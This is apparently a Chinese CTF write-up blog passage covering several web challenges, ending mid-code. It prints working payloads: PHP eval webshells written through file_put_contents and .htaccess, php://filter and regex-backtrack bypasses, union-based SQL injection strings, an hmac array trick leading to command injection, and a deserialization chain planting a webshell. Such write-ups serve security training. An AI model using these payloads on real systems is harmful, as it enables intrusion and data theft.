<h3 id="方法一、写入一句话木马到index-php"><a href="#方法一、写入一句话木马到index-php" class="headerlink" title="方法一、写入一句话木马到index.php"></a>方法一、写入一句话木马到index.php</h3><p>直接写入一句话木马到index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?filename=index.php&amp;content=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;npfs&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>蚁剑连接，找到flag即可。</p>
<h3 id="方法二、写入一个-user-ini让index-php自动包含上我们写入的马"><a href="#方法二、写入一个-user-ini让index-php自动包含上我们写入的马" class="headerlink" title="方法二、写入一个.user.ini让index.php自动包含上我们写入的马"></a>方法二、写入一个<code>.user.ini</code>让index.php自动包含上我们写入的马</h3><p><strong><code> file_put_contents($filename, $content . &quot;\nHello, world&quot;);</code>,对于这里的末尾追加数据，我们考虑利用<code>\</code>绕过\n换行追加数据导致.htaccess解析错误的限制</strong></p>
<p><strong>我们可以利用#注释符将整句话都注视掉，但是又由于有\n换行符的存在，我们不能直接使用#就将其注释掉，需要把\n进行“吃”掉。那么最常见的操作就是利用\斜杠将其转义了，这样<code>\\n</code>就是一个简单的\n字符串了。</strong></p>
<p>.htaccess文件内容：</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="xml">.htaccess</span></span><br><span class="line"></span><br><span class="line"><span class="xml">php_value auto_prepend_fil\</span></span><br><span class="line"><span class="xml">e .htaccess</span></span><br><span class="line"><span class="xml">#</span><span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><span class="xml">\</span></span><br></pre></td></tr></table></figure>
<p>至于最终对flag的读取，因为content中对flag进行了黑名单过滤，绕过很简单，这里就不多说了</p>
<p>最终payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?content=php_value%<span class="number">20</span>auto_prepend_fil\%<span class="number">0</span>ae%<span class="number">20.</span>htaccess%<span class="number">0</span>a%<span class="number">23</span><span class="meta">&lt;?php</span>%<span class="number">20</span>system(<span class="string">&#x27;cat%20/fla&#x27;</span>.<span class="string">&#x27;g&#x27;</span>);<span class="meta">?&gt;</span>\&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>


<hr>
<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>后来看了wp发现对于黑名单的绕过，还可以利用base64编码</p>
<p>p神的一篇文章：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a><br>提到file_put_contents函数中的第一个参数<code>$filename</code>，即写入的文件名是可以控制协议的，所以我们可以用<code>php://filter流</code>的<code>base64-decode</code>方法将文件内容参数<code>$content</code>进行base64解码，那么这样就可以通过将内容进行base64加密来绕过stristr函数的检查。<br><strong>测试代码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Hacker&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125; </span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>对要写入的content进行base64编码：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;PD9waHAgcGhwaW5mbygpOyA/Pg==&#x27;</span></span><br></pre></td></tr></table></figure>
<p>测试payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?filename=php:<span class="comment">//filter/write=convert.base64-decode/resource=phpinfo.php&amp;content=PD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br></pre></td></tr></table></figure>
<p>访问<code>phpinfo.php</code>，成功显示phpinfo信息。</p>
<hr>
<h3 id="方法四-：回溯绕过，利用php伪协议-写入WebShell"><a href="#方法四-：回溯绕过，利用php伪协议-写入WebShell" class="headerlink" title="方法四 ：回溯绕过，利用php伪协议 写入WebShell"></a>方法四 ：回溯绕过，利用php伪协议 写入WebShell</h3><p><strong>绕过preg_match</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>因为正则判断写的是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</code>而不是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) !== 0)</code> ，因此存在了被绕过的可能。</p>
<p>思路是：通过正则匹配的递归次数来绕过，正则匹配的递归次数由<code>pcre.backtrack_limit</code>参数来控制<br>PHP5.3.7 版本之前默认值为 10万 ，PHP5.3.7 版本之后默认值为 100万。该值可以通过<code>php.ini</code>设置，也可以通过 <code>phpinfo</code>页面查看。</p>
<p>要让preg_match返回false，也就是匹配不到，即可绕过preg_match。这里就有一个骚操作，就是通过设置<code>pcre.backtrack_limit</code>值为0，使得回溯次数为0，来使得正则匹配什么都不匹配，即返回false。<br>测试一下，是否能绕过preg_match：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;pcre.backtrack_limit&#x27;</span>,<span class="number">0</span>);</span><br><span class="line">var_dump(preg_match(<span class="string">&#x27;/[^a-z\.]/&#x27;</span>,<span class="string">&#x27;php://filter&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//bool(false) </span></span><br></pre></td></tr></table></figure>
<p>因为php版本&gt;=7，所以需要特别设置<code>pcre.jit</code>这个环境变量为0，不适用JIT引擎来匹配正则表达式，就使得<code>pcre.backtrack_limit</code>这个环境变量能正常生效，绕过preg_match函数。</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="xml">php_value pcre.backtrack_limit 0</span></span><br><span class="line"><span class="xml">php_value pcre.jit 0</span></span><br><span class="line"><span class="xml">php_value auto_append_file .htaccess</span></span><br><span class="line"><span class="xml">#</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><span class="xml">\</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?filename=php:<span class="regexp">//</span>filter<span class="regexp">/write=convert.base64-decode/</span>resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs/Plw&amp;<span class="number">1</span>=phpinfo();</span><br></pre></td></tr></table></figure>




<h2 id="CISCN2019-总决赛-Day1-Web3-Flask-Message-Board"><a href="#CISCN2019-总决赛-Day1-Web3-Flask-Message-Board" class="headerlink" title="[CISCN2019 总决赛 Day1 Web3]Flask Message Board"></a>[CISCN2019 总决赛 Day1 Web3]Flask Message Board</h2><p>进入网站，为一个留言板服务，并且带有机器人过滤机制，页面底部有一个管理员入口但无法进入。</p>
<p>fuzz下，发现在Author处有回显</p>
<p><img src="https://img.npfs06.top/20210303174158.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>在Author处写入,（这里存在长度限制）得到key，很明显的cookie伪造</p>
<p><img src="https://img.npfs06.top/20210303174243.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210303174756.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>修改cookie后，可以成功打开/admin，登录管理员后可以进入<code>/admin</code>后台，其中后台提供了网站源码和TensorFlow模型上传，并且从网页的注释和源码中可得知网站可以下载当前使用的模型。</p>
<p>F12就看到一些提示</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">Todo: <span class="built_in">add</span> /admin/model_download button </span><br><span class="line">&lt;<span class="keyword">a</span> href=<span class="string">&quot;/admin/source_thanos&quot;</span>&gt;Open Source&lt;/<span class="keyword">a</span>&gt;</span><br><span class="line"> </span><br><span class="line">zip <span class="built_in">file</span> <span class="keyword">with</span> detection.meta detection.index detection.data<span class="number">-00000</span>-<span class="keyword">of</span><span class="number">-00001</span> <span class="number">3</span> TensorFlow(<span class="number">1.12</span>) <span class="built_in">files</span>! </span><br><span class="line"></span><br><span class="line">The model need x:<span class="number">0</span> <span class="built_in">to</span> input <span class="keyword">a</span> <span class="built_in">number</span> , <span class="keyword">and</span> y:<span class="number">0</span> <span class="built_in">to</span> output <span class="keyword">the</span> <span class="built_in">result</span> <span class="string">&quot;Human&quot;</span> <span class="keyword">or</span> <span class="string">&quot;Bot&quot;</span> </span><br></pre></td></tr></table></figure>
<p>访问<code>/admin/model_download</code>可以把模型下载下来，源码则在<code>/admin/source</code>，最后是TensorFlow模型介绍</p>
<p>看了wp,发现还是不理解</p>
<p><a href="https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562304584548.png"><img src="https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562304584548.png" alt="1562304584548"></a></p>
<ol>
<li>审计Web逻辑和TensorFlow模型（使用TensorBoard浏览模型二进制文件）可以发现当输入的字符串字符总和为1024时会触发读取<code>/flag</code>的后门（模型生成代码可参考<code>model_init.py</code>，题目已包含生成好的二进制模型）</li>
</ol>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">Tensorboard可视化</span><br><span class="line">def init(model_path):<span class="type"></span></span><br><span class="line"><span class="type">    new_sess </span>= tf.Session()</span><br><span class="line">    meta_file = model_path + <span class="string">&quot;.meta&quot;</span></span><br><span class="line">    model = model_path</span><br><span class="line">    saver = tf.train.import_meta_graph(meta_file)</span><br><span class="line">    saver.restore(<span class="keyword">new</span><span class="type">_sess</span>, model)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span><span class="type">_sess</span></span><br><span class="line"><span class="type">sess</span> = init(<span class="string">&#x27;detection_model/detection&#x27;</span>)</span><br><span class="line">writer = tf.summary.FileWriter(<span class="string">&quot;./log&quot;</span>, sess.graph)</span><br><span class="line">然后在命令行执行tensorboard --logdir ./log</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562307817821.png"><img src="https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562307817821.png" alt="1562307817821"></a></p>
<p>将评论转换为特征值（考虑比赛环境，简化为一个数字，由字符串总和得）</p>
<p><a href="https://blog.csdn.net/lin453701006/article/details/79391088" target="_blank">TensorBoard使用方法</a></p>
<p><a href="https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562307493848.png"><img src="https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562307493848.png" alt="1562307493848"></a></p>
<p>当特征值为1024时触发flag分支</p>
<p><a href="https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562307600460.png"><img src="https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562307600460.png" alt="1562307600460"></a></p>
<p><code>/flag</code>字符串节点，作为ReadFile参数</p>
<p><a href="https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562307636446.png"><img src="https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562307636446.png" alt="1562307636446"></a></p>
<p>ReadFile节点 8. 因此我们可以构造一个总和1024的字符串，读取出flag（比如<code>aaaaaabxCZC</code>）。</p>
<p><a href="https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562307755402.png"><img src="https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562307755402.png" alt="1562307755402"></a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#model_init.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">x = tf.placeholder(tf.int32, name=<span class="string">&quot;x&quot;</span>)</span><br><span class="line">w = tf.Variable(<span class="number">1</span>, dtype=tf.int32, name=<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">b = tf.Variable(<span class="string">&quot;You are: &quot;</span>)</span><br><span class="line">c = tf.constant(<span class="number">2</span>, dtype=tf.int32, name=<span class="string">&#x27;odd&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    flag_string = tf.read_file(<span class="string">&#x27;/flag&#x27;</span>, name=<span class="string">&#x27;getflag&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> flag_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">even</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fail</span>():</span></span><br><span class="line">        <span class="keyword">return</span> tf.constant(<span class="string">&#x27;Bot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ans = tf.cond(tf.equal(x, <span class="number">1024</span>), flag, fail, name=<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">odd</span>():</span></span><br><span class="line">    <span class="keyword">return</span> tf.constant(<span class="string">&#x27;Human&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">first = tf.mod(x, c)</span><br><span class="line">ans = tf.cond(tf.equal(first, <span class="number">0</span>), even, odd, name=<span class="string">&quot;Answer&quot;</span>)</span><br><span class="line">y = tf.string_join([b, ans], name=<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">saver = tf.train.Saver()</span><br><span class="line">sess = tf.Session()</span><br><span class="line">sess.run(tf.global_variables_initializer())</span><br><span class="line"><span class="comment"># y_out = sess.run(y, &#123;&#x27;x:0&#x27;: 1028&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(y_out)</span></span><br><span class="line">saver.save(sess, <span class="string">&#x27;detection_model/detection&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>没啥好说的,  注册页面，用户名处存在注入点</p>
<p><code>0‘ union select group_concat(table_name) from information_schema.tables where table_schema=database() #</code></p>
<p>得到 flag 表</p>
<p><code>0’ union select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39; #</code></p>
<p>得到flag字段</p>
<p>paylaod:</p>
<p><code>0&#39; union select flag from flag#</code>,登入即可得到flag</p>
<h2 id="羊城杯-2020-Blackcat"><a href="#羊城杯-2020-Blackcat" class="headerlink" title="[羊城杯 2020]Blackcat"></a>[羊城杯 2020]Blackcat</h2><p>进入环境，是个黑猫警长的页面，把mp3下载下来，010editor打开，可以在最后发现一段代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;谁！竟敢踩我一只耳的尾巴！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$clandestine</span> = getenv(<span class="string">&quot;clandestine&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;White-cat-monitor&#x27;</span>]))</span><br><span class="line">    <span class="variable">$clandestine</span> = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;White-cat-monitor&#x27;</span>], <span class="variable">$clandestine</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$hh</span> = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>], <span class="variable">$clandestine</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$hh</span> !== <span class="variable">$_POST</span>[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;nc&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>似乎是个原题 <a href="https://neversecure.ca/category/bug-hunting/">https://neversecure.ca/category/bug-hunting/</a></p>
<p>hash_hmac — 使用 HMAC 方法生成带有密钥的哈希值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Copyhash_hmac ( <span class="keyword">string</span> <span class="variable">$algo</span> , <span class="keyword">string</span> <span class="variable">$data</span> , <span class="keyword">string</span> <span class="variable">$key</span> [, <span class="keyword">bool</span> <span class="variable">$raw_output</span> = <span class="literal">false</span> ] ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>在php中md5算法、sha256算法等无法处理数组，这个trick通常来绕过<code>if(@md5($_GET[&#39;a&#39;]) === @md5($_GET[&#39;b&#39;]))</code>，因为当传入参数为数组时，返回值是NULL，造成了NULL===NULL</p>
<p><img src="https://img.npfs06.top/20210305001142.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>那么我们传<code>White-cat-monitor</code>为数组，经第一个hash_hmac（）函数执行后<code>$clandestine</code>为NULL，这也就意味着第二个hash_hmac()函数的secret 为<code>NULL</code>,即$hh可控，于是绕过判断，命令执行</p>
<p>buu的flag在env，payload如下</p>
<p><img src="https://img.npfs06.top/20210305001013.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment">#BUU payload</span></span><br><span class="line"><span class="attribute">White</span>-cat-monitor[]=<span class="number">1</span>&amp;One-ear=;env&amp;Black-Cat-Sheriff=afd<span class="number">556602</span>cf<span class="number">62</span>addfe<span class="number">4132</span>a<span class="number">81</span>b<span class="number">2</span>d<span class="number">62</span>b<span class="number">9</span>db<span class="number">1</span>b<span class="number">6719</span>f<span class="number">83</span>e<span class="number">16</span>cce<span class="number">13</span>f<span class="number">51960</span>f<span class="number">56791</span>b</span><br></pre></td></tr></table></figure>
<p>羊城杯的flag在flag.php，如下</p>
<p><img src="https://img.npfs06.top/20210305000210.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="羊城杯-2020-EasySer"><a href="#羊城杯-2020-EasySer" class="headerlink" title="[羊城杯 2020]EasySer"></a>[羊城杯 2020]EasySer</h2><p><code>/robots.txt</code>得到star1.php，发现是一个ssrf，查看源代码发现要使用不安全的协议，做法如下</p>
<p><img src="https://img.npfs06.top/20210308225237.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yasuo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You don&#x27;t look very happy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = <span class="variable">$text</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$d</span>   = <span class="string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$a</span>= <span class="variable">$d</span>. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">         @file_put_contents(<span class="keyword">$this</span>-&gt; file,<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yasuo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m the best happy windy man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*$c=$_GET[&#x27;c&#x27;];</span></span><br><span class="line"><span class="comment">echo $x=unserialize($c);*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>死亡die绕过，老考点了，之前wp里也有写过，这里就不过多记录了</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yongen;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;go away hacker&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;php://filter/write=convert.base64-decode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&quot;aaaPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="variable">$thie</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> GWHT();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$flag</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="网鼎杯-2020-玄武组-SSRFMe"><a href="#网鼎杯-2020-玄武组-SSRFMe" class="headerlink" title="[网鼎杯 2020 玄武组]SSRFMe"></a>[网鼎杯 2020 玄武组]SSRFMe</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=preg_match(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=gethostbyname(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=ip2long(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 